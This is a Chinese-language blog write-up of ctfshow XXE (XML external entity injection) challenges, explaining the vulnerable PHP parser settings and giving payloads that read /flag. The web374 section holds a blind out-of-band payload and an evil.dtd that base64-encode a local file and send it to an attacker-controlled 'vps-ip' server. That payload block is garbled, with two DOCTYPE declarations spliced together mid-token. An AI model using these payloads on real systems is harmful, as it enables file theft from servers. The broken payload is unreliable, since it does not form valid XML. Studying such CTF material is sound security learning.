---
title: XXE ctfshow Writeup
date: 2026-08-28 09:25:00
categories:
  - CTF wp
tags:
  - CTF
  - XXE
description: XXE ctfshow Writeup
---


XXE:**XML外部实体注入**



# ctfshow

## web373

代码漏洞点

1. `libxml_disable_entity_loader(false);` - 启用了外部实体加载（默认是禁用的，这里特意开启了）
2. `$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);` 两个关键参数：
   - `LIBXML_NOENT`：允许替换实体（将实体引用替换为实体内容）
   - `LIBXML_DTDLOAD`：允许加载外部 DTD（文档类型定义）
3. 接收用户可控的 XML 输入（`php://input`）并直接解析

```html 
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE payload [
<!ENTITY payload SYSTEM "file:///flag">
]>
<web373>
<ctfshow>&payload;</ctfshow>
</web373>
```

![image-20250904184418317](/img/ctf/xxe-ctfshow-wp-001.png)

## web374

代码特点

1. 依然启用了外部实体加载（`libxml_disable_entity_loader(false)`）
2. 使用了危险的 XML 解析参数（`LIBXML_NOENT | LIBXML_DTDLOAD`）
3. 接收用户可控的 XML 输入（`php://input`）
4. **关键区别**：只解析 XML 但不输出任何内容，常规的直接读取文件并显示的方法无法直接获取结果

利用方法：*盲 XXE 攻击*

由于没有直接输出，需要使用**带外数据（OOB）传输**的方式，将读取到的文件内容发送到攻击者控制的服务器。

payload:

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE root [
    <!<?xml version="1.0" encoding="UTF-8"?>

<!-- 要引用（dtd里面），所以要加百分号% -->
<!-- /flag 改成 /etc/passwd 可能会失败，因为内容太多了 -->
<!DOCTYPE hacker[
    <!ENTITY  % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
    <!ENTITY  % myurl SYSTEM "http://vps-ip/test.dtd">

    %myurl;
]> 
<!-- 不能直接<!ENTITY  % myurl SYSTEM "http://vps-ip:port/%file"> ，因为默认不允许把本地文件发送到远程dtd里面，需要绕一圈，绕过这个限制-->
<!-- %myurl;会读取远程dtd文件，读到了以后，因为远程dtd文件有一个实体的定义（% dtd），那么就会解析这个实体定义。（% dtd）实体的定义内容是另外一个实体定义（&#x25; vps），那就会解析（&#x25; vps），就会执行远程请求，请求地址（http://vps-ip:port/%file），会在我们的vps日志上留下痕迹。
也可以起nc监听端口，能判断是否有向我们的vps发送请求以及请求内容。起nc的话% myurl的值，不要加端口，就vps-ip够了。
总结就是，%myurl 这种引用会自动向地址发送请求。 -->

<root>
1
</root>
 % file SYSTEM "file:///flag">
    <!ENTITY % dtd SYSTEM "http://攻击者服务器地址/evil.dtd">
    %dtd;
    %send;
]>
<root></root>
```

evil.dtd:

```xml-dtd
<!ENTITY % dtd "<!ENTITY &#x25; vps SYSTEM 'http://vps-ip:port/%file;'> ">
<!-- &#x25; 就是百分号（&#x25; vps=% vps），因为是嵌套在里面的引用，不能直接写百分号 -->
<!-- 如果选择nc监听的话，端口一定要加！！！ -->
<!-- 如果选择看日志的话，端口一定不能加！！！ -->

<!-- 引用（执行）dtd实体，vps被注册 -->
%dtd;
<!-- 引用（执行）vps实体，接收%file变量的内容 -->
%vps;
```

## web378——无回显XXE，外部实体，绕过过滤

[浅析无回显的XXE（Blind XXE） - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/332937.html)

在路由`/doLogin`下发POST包:

```xml-dtd
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///flag">
]>

<user><username>&xxe;</username><password>&xxe;</password></user>
```

![image-20250904191357930](/img/ctf/xxe-ctfshow-wp-002.png)
